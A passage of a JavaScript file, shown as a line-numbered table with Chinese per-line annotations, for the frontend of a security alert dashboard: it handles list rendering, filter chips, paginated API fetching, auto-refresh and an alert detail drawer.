| 204 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        ? '<span class="alert-item__ip">' + sourceIp + "</span>"` |
| 205 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        : "") +` |
| 206 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<span>' +` |
| 207 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      threatType +` |
| 208 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</span>" +` |
| 209 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      statusPill(alert.status) +` |
| 210 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</div>" +` |
| 211 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</div>" +` |
| 212 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<div class="alert-item__side">' +` |
| 213 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<button class="btn btn--ghost btn--sm" data-action="detail" type="button">查看</button>' +` |
| 214 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</div>" +` |
| 215 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</li>"` |
| 216 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 217 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 218 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 219 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderChips() {` |
| 220 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const chips = [];` |
| 221 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.level)` |
| 222 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      chips.push(chip("等级：" + levelText(state.level), "level"));` |
| 223 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.status)` |
| 224 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      chips.push(chip("状态：" + statusText(state.status), "status"));` |
| 225 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.type) chips.push(chip("类型：" + state.type, "type"));` |
| 226 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.q) chips.push(chip('"' + state.q + '"', "q"));` |
| 227 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.range && state.range !== "all")` |
| 228 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      chips.push(chip("近 " + state.range, "range", false));` |
| 229 | 页面更新：修改元素内容、样式或状态。 | `    el.activeChips.innerHTML = chips.join("");` |
| 230 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 231 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 232 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function chip(label, key, removable = true) {` |
| 233 | 返回结果：把计算值交给调用方。 | `    return (` |
| 234 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      '<span class="chip">' +` |
| 235 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      escapeHtml(label) +` |
| 236 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      (removable` |
| 237 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        ? '<button class="chip__close" type="button" data-clear="' +` |
| 238 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          key +` |
| 239 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          '" aria-label="清除">×</button>'` |
| 240 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        : "") +` |
| 241 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      "</span>"` |
| 242 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    );` |
| 243 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 244 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 245 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function renderCounts({ filteredTotal }) {` |
| 246 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (filteredTotal !== undefined) {` |
| 247 | 页面更新：修改元素内容、样式或状态。 | `      el.countFiltered.textContent = String(filteredTotal);` |
| 248 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.total = filteredTotal;` |
| 249 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 250 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 251 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 252 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function refreshGlobalCounts() {` |
| 253 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 254 | 注释：说明前端逻辑或交互意图。 | `      // 全量（不带 level/status/type/q/range）用于显示"全部"与"未处理"基线` |
| 255 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const { data, headers } = await fetchApi("/api/alerts", {` |
| 256 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        query: { limit: 1, offset: 0 },` |
| 257 | 返回结果：把计算值交给调用方。 | `        returnResponse: true,` |
| 258 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 259 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      void data;` |
| 260 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const total = parseInt(headers.get("X-Total-Count") \|\| "0", 10);` |
| 261 | 页面更新：修改元素内容、样式或状态。 | `      el.countTotal.textContent = String(total \|\| 0);` |
| 262 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 263 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const { headers: openHeaders } = await fetchApi("/api/alerts", {` |
| 264 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        query: { limit: 1, offset: 0, status: "open" },` |
| 265 | 返回结果：把计算值交给调用方。 | `        returnResponse: true,` |
| 266 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 267 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const openCount = parseInt(openHeaders.get("X-Total-Count") \|\| "0", 10);` |
| 268 | 页面更新：修改元素内容、样式或状态。 | `      el.countOpen.textContent = String(openCount \|\| 0);` |
| 269 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (_) {` |
| 270 | 注释：说明前端逻辑或交互意图。 | `      // 计数失败不阻断主流程` |
| 271 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 272 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 273 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 274 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 275 | 注释：说明前端逻辑或交互意图。 | `   * 数据获取` |
| 276 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 277 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function loadList({ append = false } = {}) {` |
| 278 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (!append) {` |
| 279 | 页面更新：修改元素内容、样式或状态。 | `      el.list.innerHTML =` |
| 280 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        '<li class="alert-list__empty"><span class="loader"></span><span style="margin-left: 8px">加载中…</span></li>';` |
| 281 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.offset = 0;` |
| 282 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 283 | 页面更新：修改元素内容、样式或状态。 | `    el.listStatus.textContent = "";` |
| 284 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 285 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const query = {` |
| 286 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      limit: PAGE_SIZE,` |
| 287 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      offset: state.offset,` |
| 288 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    };` |
| 289 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.level) query.level = state.level;` |
| 290 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.status) query.status = state.status;` |
| 291 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.type) query.type = state.type;` |
| 292 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (state.q) query.q = state.q;` |
| 293 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const since = rangeSince(state.range);` |
| 294 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (since) query.since = since;` |
| 295 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 296 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 297 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const { data, headers } = await fetchApi("/api/alerts", {` |
| 298 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        query,` |
| 299 | 返回结果：把计算值交给调用方。 | `        returnResponse: true,` |
| 300 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 301 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const items = Array.isArray(data) ? data : [];` |
| 302 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      items.forEach((it) => state.cache.set(it.id, it));` |
| 303 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 304 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const total = parseInt(headers.get("X-Total-Count") \|\| "0", 10);` |
| 305 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      renderCounts({ filteredTotal: total });` |
| 306 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      renderList(items, { append });` |
| 307 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 308 | 注释：说明前端逻辑或交互意图。 | `      // 分页按钮` |
| 309 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const loaded = state.offset + items.length;` |
| 310 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (loaded < total) {` |
| 311 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        el.btnLoadMore.hidden = false;` |
| 312 | 页面更新：修改元素内容、样式或状态。 | `        el.btnLoadMore.textContent = \`加载更多（已显示 ${loaded} / ${total}）\`;` |
| 313 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else {` |
| 314 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        el.btnLoadMore.hidden = true;` |
| 315 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 316 | 页面更新：修改元素内容、样式或状态。 | `      el.listStatus.textContent = total` |
| 317 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        ? \`共 ${total} 条，本页 ${items.length}\`` |
| 318 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        : "";` |
| 319 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 320 | 页面更新：修改元素内容、样式或状态。 | `      el.list.innerHTML =` |
| 321 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        '<li class="alert-list__empty">' +` |
| 322 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        escapeHtml("拉取失败：" + (err.message \|\| "")) +` |
| 323 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        "</li>";` |
| 324 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      el.btnLoadMore.hidden = true;` |
| 325 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 326 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 327 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 328 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function loadTypes() {` |
| 329 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 330 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const types = await fetchApi("/api/alerts/types");` |
| 331 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const current = state.type;` |
| 332 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const frag = ['<option value="">全部类型</option>'];` |
| 333 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      (types \|\| []).forEach((t) => {` |
| 334 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        frag.push(` |
| 335 | 前端语句：驱动页面交互、状态管理或数据展示。 | `          '<option value="' +` |
| 336 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            escapeHtml(t) +` |
| 337 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            '"' +` |
| 338 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            (t === current ? " selected" : "") +` |
| 339 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            ">" +` |
| 340 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            escapeHtml(t) +` |
| 341 | 前端语句：驱动页面交互、状态管理或数据展示。 | `            "</option>"` |
| 342 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        );` |
| 343 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 344 | 页面更新：修改元素内容、样式或状态。 | `      el.selType.innerHTML = frag.join("");` |
| 345 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (_) {` |
| 346 | 注释：说明前端逻辑或交互意图。 | `      // 忽略——筛选器降级为只显示"全部类型"` |
| 347 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 348 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 349 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 350 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 351 | 注释：说明前端逻辑或交互意图。 | `   * 筛选交互` |
| 352 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 353 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindFilterHandlers() {` |
| 354 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnLevelGroup.forEach((btn) => {` |
| 355 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      btn.addEventListener("click", () => {` |
| 356 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `        const level = btn.dataset.level \|\| "";` |
| 357 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        state.level = level;` |
| 358 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `        el.btnLevelGroup.forEach((b) => b.classList.toggle("is-active", b === btn));` |
| 359 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        applyFilters();` |
| 360 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      });` |
| 361 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 362 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 363 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.selStatus.addEventListener("change", () => {` |
| 364 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.status = el.selStatus.value;` |
| 365 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      applyFilters();` |
| 366 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 367 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.selRange.addEventListener("change", () => {` |
| 368 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.range = el.selRange.value;` |
| 369 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      applyFilters();` |
| 370 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 371 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.selType.addEventListener("change", () => {` |
| 372 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.type = el.selType.value;` |
| 373 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      applyFilters();` |
| 374 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 375 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 376 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const onSearch = debounce(() => {` |
| 377 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.q = el.inputQ.value.trim();` |
| 378 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      applyFilters();` |
| 379 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }, 250);` |
| 380 | 事件绑定：监听用户操作并触发对应处理函数。 | `    el.inputQ.addEventListener("input", onSearch);` |
| 381 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 382 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnRefresh.addEventListener("click", () => {` |
| 383 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      applyFilters();` |
| 384 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      loadTypes();` |
| 385 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      refreshGlobalCounts();` |
| 386 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 387 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.btnLoadMore.addEventListener("click", () => {` |
| 388 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.offset += PAGE_SIZE;` |
| 389 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      loadList({ append: true });` |
| 390 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 391 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 392 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.activeChips.addEventListener("click", (e) => {` |
| 393 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const btn = e.target.closest("[data-clear]");` |
| 394 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!btn) return;` |
| 395 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const key = btn.dataset.clear;` |
| 396 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (key === "level") {` |
| 397 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        state.level = "";` |
| 398 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `        el.btnLevelGroup.forEach((b) =>` |
| 399 | 页面更新：修改元素内容、样式或状态。 | `          b.classList.toggle("is-active", !b.dataset.level)` |
| 400 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        );` |
| 401 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else if (key === "status") {` |
| 402 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        state.status = "";` |
| 403 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        el.selStatus.value = "";` |
| 404 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else if (key === "type") {` |
| 405 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        state.type = "";` |
| 406 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        el.selType.value = "";` |
| 407 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else if (key === "q") {` |
| 408 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        state.q = "";` |
| 409 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        el.inputQ.value = "";` |
| 410 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 411 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      applyFilters();` |
| 412 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 413 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 414 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.toggleAuto.addEventListener("change", () => {` |
| 415 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.autoRefresh = el.toggleAuto.checked;` |
| 416 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (state.autoRefresh) {` |
| 417 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        state.autoTimer = setInterval(applyFilters, AUTO_REFRESH_MS);` |
| 418 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      } else if (state.autoTimer) {` |
| 419 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        clearInterval(state.autoTimer);` |
| 420 | 前端语句：驱动页面交互、状态管理或数据展示。 | `        state.autoTimer = null;` |
| 421 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      }` |
| 422 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 423 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 424 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 425 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function applyFilters() {` |
| 426 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    renderChips();` |
| 427 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    state.offset = 0;` |
| 428 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    loadList({ append: false });` |
| 429 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 430 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 431 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 432 | 注释：说明前端逻辑或交互意图。 | `   * 列表点击 → 抽屉` |
| 433 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 434 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function bindListHandlers() {` |
| 435 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.list.addEventListener("click", (e) => {` |
| 436 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const li = e.target.closest(".alert-item");` |
| 437 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!li) return;` |
| 438 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const id = li.dataset.id;` |
| 439 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!id) return;` |
| 440 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      openDrawer(id);` |
| 441 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 442 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.list.addEventListener("keydown", (e) => {` |
| 443 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (e.key !== "Enter" && e.key !== " ") return;` |
| 444 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const li = e.target.closest(".alert-item");` |
| 445 | 条件判断：根据页面状态或数据决定执行路径。 | `      if (!li) return;` |
| 446 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      e.preventDefault();` |
| 447 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      openDrawer(li.dataset.id);` |
| 448 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 449 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 450 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 451 | 注释：说明前端逻辑或交互意图。 | `  /* =============================================================` |
| 452 | 注释：说明前端逻辑或交互意图。 | `   * 抽屉` |
| 453 | 注释：说明前端逻辑或交互意图。 | `   * ============================================================= */` |
| 454 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  async function openDrawer(id) {` |
| 455 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    state.activeId = id;` |
| 456 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    highlightActive(id);` |
| 457 | 注释：说明前端逻辑或交互意图。 | `    // 先展示缓存，再拉最新详情` |
| 458 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const cached = state.cache.get(id);` |
| 459 | 条件判断：根据页面状态或数据决定执行路径。 | `    if (cached) populateDrawer(cached);` |
| 460 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    showDrawer();` |
| 461 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    try {` |
| 462 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const full = await fetchApi("/api/alerts/" + encodeURIComponent(id));` |
| 463 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      state.cache.set(id, full);` |
| 464 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      populateDrawer(full);` |
| 465 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    } catch (err) {` |
| 466 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      toast("获取告警详情失败：" + (err.message \|\| ""), "error");` |
| 467 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    }` |
| 468 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 469 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 470 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function highlightActive(id) {` |
| 471 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `    el.list.querySelectorAll(".alert-item").forEach((li) => {` |
| 472 | 页面更新：修改元素内容、样式或状态。 | `      li.classList.toggle("is-active", li.dataset.id === id);` |
| 473 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    });` |
| 474 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 475 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 476 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function showDrawer() {` |
| 477 | 页面更新：修改元素内容、样式或状态。 | `    el.drawer.classList.add("is-open");` |
| 478 | 页面更新：修改元素内容、样式或状态。 | `    el.drawerOverlay.classList.add("is-open");` |
| 479 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.drawer.setAttribute("aria-hidden", "false");` |
| 480 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.drawerOverlay.setAttribute("aria-hidden", "false");` |
| 481 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 482 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 483 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function closeDrawer() {` |
| 484 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    state.activeId = null;` |
| 485 | 页面更新：修改元素内容、样式或状态。 | `    el.drawer.classList.remove("is-open");` |
| 486 | 页面更新：修改元素内容、样式或状态。 | `    el.drawerOverlay.classList.remove("is-open");` |
| 487 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.drawer.setAttribute("aria-hidden", "true");` |
| 488 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.drawerOverlay.setAttribute("aria-hidden", "true");` |
| 489 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.list` |
| 490 | DOM 查询：定位页面元素以便读取或更新。 | `      .querySelectorAll(".alert-item.is-active")` |
| 491 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `      .forEach((li) => li.classList.remove("is-active"));` |
| 492 | 前端语句：驱动页面交互、状态管理或数据展示。 | `  }` |
| 493 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 494 | 函数逻辑：封装一个前端交互、请求或渲染步骤。 | `  function populateDrawer(alert) {` |
| 495 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const level = LEVELS.includes(alert.level) ? alert.level : "low";` |
| 496 | 页面更新：修改元素内容、样式或状态。 | `    el.dTitle.textContent = alert.title \|\| alert.summary \|\| "告警详情";` |
| 497 | 页面更新：修改元素内容、样式或状态。 | `    el.dLevelBadge.innerHTML = levelBadge(level);` |
| 498 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 499 | 页面更新：修改元素内容、样式或状态。 | `    el.dId.textContent = alert.id \|\| "—";` |
| 500 | 页面更新：修改元素内容、样式或状态。 | `    el.dTime.textContent = formatTime(alert.timestamp) \|\| "—";` |
| 501 | 页面更新：修改元素内容、样式或状态。 | `    el.dType.textContent = alert.threat_type \|\| "—";` |
| 502 | 页面更新：修改元素内容、样式或状态。 | `    el.dStatus.innerHTML = statusPill(alert.status);` |
| 503 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 504 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const src = alert.source_ip` |
| 505 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ? alert.source_ip + (alert.source_port ? ":" + alert.source_port : "")` |
| 506 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      : "—";` |
| 507 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const dst = alert.dest_ip` |
| 508 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      ? alert.dest_ip + (alert.dest_port ? ":" + alert.dest_port : "")` |
| 509 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      : "—";` |
| 510 | 页面更新：修改元素内容、样式或状态。 | `    el.dSource.textContent = src;` |
| 511 | 页面更新：修改元素内容、样式或状态。 | `    el.dDest.textContent = dst;` |
| 512 | 页面更新：修改元素内容、样式或状态。 | `    el.dProto.textContent = alert.protocol \|\| "—";` |
| 513 | 页面更新：修改元素内容、样式或状态。 | `    el.dAction.textContent = alert.recommended_action \|\| "—";` |
| 514 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 515 | 页面更新：修改元素内容、样式或状态。 | `    el.dModel.textContent = alert.model_version \|\| "—";` |
| 516 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const conf = typeof alert.confidence === "number" ? alert.confidence : null;` |
| 517 | 页面更新：修改元素内容、样式或状态。 | `    el.dConfidence.textContent =` |
| 518 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      conf === null ? "—" : (conf * 100).toFixed(1) + " %";` |
| 519 | 前端语句：驱动页面交互、状态管理或数据展示。 | `    el.dConfidenceBar.style.width =` |
| 520 | 前端语句：驱动页面交互、状态管理或数据展示。 | `      conf === null ? "0%" : Math.min(100, Math.max(0, conf * 100)) + "%";` |
| 521 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 522 | 页面更新：修改元素内容、样式或状态。 | `    el.dExplanation.textContent = alert.explanation \|\| "（模型未提供推理说明）";` |
| 523 | 空行：分隔前端逻辑块。 | `&nbsp;` |
| 524 | 注释：说明前端逻辑或交互意图。 | `    // 特征表` |
| 525 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const features = alert.features \|\| {};` |
| 526 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `    const rows = Object.keys(features).map((k) => {` |
| 527 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const v = features[k];` |
| 528 | 变量声明：保存 DOM、状态、配置或临时计算结果。 | `      const rendered =` |
